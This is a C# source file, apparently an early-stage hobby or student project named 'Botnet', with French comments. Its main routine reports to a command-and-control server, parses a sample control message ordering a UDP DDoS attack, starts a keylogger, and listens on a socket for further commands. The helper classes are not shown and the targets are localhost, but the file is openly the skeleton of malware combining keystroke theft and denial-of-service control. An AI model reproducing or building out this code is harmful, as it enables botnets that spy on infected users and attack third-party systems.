using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Reflection;
using Botnet;

namespace Botnet    
{
    class Program   //Classe principale du Botnet
    {
        static void Main(string[] args)  // Main du Botnet
        {
            

            //Envoi des données au CNC de façon ASYNCHRONE (Apache et MySQL doivent être démarrés en local avec les bons scripts):
            Initialization initialiser = new Initialization();
            Task test = initialiser.sendInfoToCNCAsync(); //TODO: étudier comment correctement utiliser une fonction asynchrone en C#, pas sûr que je m'y prenne de la bonne manière
            
            //Exctraction des actions, target et arguments envoyés:
            ProtocolController ptclctl = new ProtocolController("<SOC><CMD>DDOS</CMD><TARGET>127.0.0.1</TARGET><ARG1>UDP</ARG1><ARG2>1500</ARG2><EOC>");
            Console.WriteLine("Action: " + ptclctl.action + "\n");
            Console.WriteLine("Target: " + ptclctl.target + "\n");
            foreach (string str in ptclctl.arguments)
            {
                Console.WriteLine(str);
            }

            InterceptKeys interceptor = new InterceptKeys();
            interceptor.start();
            
            
            //Initialisation d'un objet ServerConnectors "sc" avec les informations les plus importantes: ip et port d'écoute:
            ServerConnectors sc = new ServerConnectors(IPAddress.Parse("127.0.0.1"), 2107);

            //Mise en écoute du socket grâce à la méthode ListenAndReceiveData() de l'objet "sc":
            sc.ListenAndReceiveData();

            Console.ReadKey();
           
           
        }



    }

}
